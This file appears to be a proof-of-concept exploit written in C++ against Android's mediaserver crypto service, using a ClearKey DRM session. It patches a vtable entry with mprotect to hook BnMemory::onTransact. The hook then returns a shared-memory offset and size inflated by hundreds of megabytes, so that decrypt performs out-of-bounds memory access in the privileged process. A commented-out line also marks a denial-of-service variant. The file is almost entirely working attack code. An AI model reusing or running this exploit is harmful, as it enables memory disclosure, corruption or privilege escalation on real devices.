#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <utils/Log.h>

#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>

#include <gui/ISurfaceComposer.h>
#include <gui/BufferQueue.h>
#include <gui/CpuConsumer.h>
#include <unistd.h>
extern "C"{
#include <NdkMediaCrypto.h>
#include <NdkMediaDrm.h>
}
#include <media/ICrypto.h>
#include "AString.h"
#include "MediaErrors.h"
#include <binder/MemoryDealer.h>
#include <binder/TextOutput.h> 


using namespace android;


static const uint8_t kClearKeyUUID[16] = {
    0x10,0x77,0xEF,0xEC,0xC0,0xB2,0x4D,0x02,
    0xAC,0xE3,0x3C,0x1E,0x52,0xE2,0xFB,0x4B
};
struct AMediaCrypto {
    sp<ICrypto> mCrypto;
};
sp<ICrypto> getICrypto(){

    bool isSupport=AMediaDrm_isCryptoSchemeSupported(kClearKeyUUID,NULL);
    if(!isSupport){
        printf("don't support clearkey\n");
        return NULL;
    }
    AMediaDrm* mediaDrm = AMediaDrm_createByUUID(kClearKeyUUID);
    AMediaDrmSessionId sessionId;
    memset(&sessionId,0,sizeof(sessionId));
    media_status_t status = AMediaDrm_openSession(mediaDrm,&sessionId);
    if(status != AMEDIA_OK){
        printf("open session failed\n");
        return NULL;
    }
    printf("id %s len is %d\n",sessionId.ptr,sessionId.length);
    AMediaCrypto* mediaCrypto = AMediaCrypto_new(kClearKeyUUID, sessionId.ptr, sessionId.length);
    //AMediaCrypto* mediaCrypto = AMediaCrypto_new(kClearKeyUUID, "aa", 2);//DoS
    if(mediaCrypto==NULL){
        printf("create media crypto failed\n");
        return NULL;
    }
    return mediaCrypto->mCrypto;

}
//hook BnMemory::onTransact
typedef status_t (*ONTRANSACT)(void *pthis,
    uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags);
ONTRANSACT g_original = NULL;
status_t onTransact(void *pthis,
    uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags)
{
    
    #define GET_MEMORY 1
    android::IBinder *that = (android::IBinder*)pthis;
    switch(code) {
        case GET_MEMORY: {
             //CHECK_INTERFACE(IMemory, data, reply);
             if (!data.checkInterface(that)) { return PERMISSION_DENIED; }
             ssize_t offset;
             size_t size;
             reply->writeStrongBinder( IInterface::asBinder(IMemory::asInterface(that)->getMemory(&offset, &size)) );
             printf("%d,%d\n",offset,size);
             //important to OOB
             offset +=0x30000000;
             size +=0x60000000;

             reply->writeInt32(offset);
             reply->writeInt32(size);
             return NO_ERROR;
         } break;
    }
    return ((ONTRANSACT)g_original)(pthis,code,data,reply,flags);
}

int main()
{

    sp<ICrypto> crypto = getICrypto();
    if(crypto==NULL)
        exit(-1);

    bool isSupport = crypto->isCryptoSchemeSupported(kClearKeyUUID);
    printf("isSupport equal %d\n",isSupport);
    CryptoPlugin::SubSample subSamples[2];
    subSamples[0].mNumBytesOfClearData=4096;
    subSamples[0].mNumBytesOfEncryptedData=0;
    subSamples[1].mNumBytesOfClearData=0;
    subSamples[1].mNumBytesOfEncryptedData=0;
    CryptoPlugin::Mode mode = (CryptoPlugin::Mode)0;//kMode_Unencrypted
    AString errMsg;
    char retBuffer[4096];
    memset(retBuffer,0,4096);
    sp<MemoryDealer> dealer = new MemoryDealer(4096*2, "test_read");
    sp<IMemory> memory = dealer->allocate(4096);

    //hook BnMemory::onTransact on vptr
    int *onTransact_BnMemory = *(int**)(IInterface::asBinder(memory)->localBinder())+16;
    mprotect((void*)((int)onTransact_BnMemory&0xfffff000),4096,PROT_READ|PROT_WRITE);
    g_original = (ONTRANSACT)(*onTransact_BnMemory);
    *onTransact_BnMemory = (int)onTransact;
    printf("BnMemory at %p,%p,%p,%p\n",g_original,onTransact,IInterface::asBinder(memory)->localBinder(),memory.get());

    memset(memory->pointer(),3,4096);
    crypto->decrypt(false,NULL,NULL,mode,memory.get(),0,subSamples,2,retBuffer,&errMsg);
    printf("%d%d\n",retBuffer[1],retBuffer[1]);
    printf("end\n");
    return 0;
}   
